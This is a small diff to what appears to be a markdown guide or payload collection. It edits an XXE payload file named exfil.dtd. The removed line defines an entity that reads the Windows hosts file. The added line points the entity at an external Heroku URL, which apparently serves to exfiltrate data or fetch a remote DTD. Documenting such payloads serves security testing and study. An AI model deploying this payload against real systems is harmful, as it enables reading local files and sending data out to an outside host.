@@ -1,5 +1,5 @@
     **exfil.dtd**
 
     ```xml
-<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">
+<!ENTITY % data SYSTEM "https://pacific-retreat-98103.herokuapp.com/koll">
 <!ENTITY exfil "%data;">
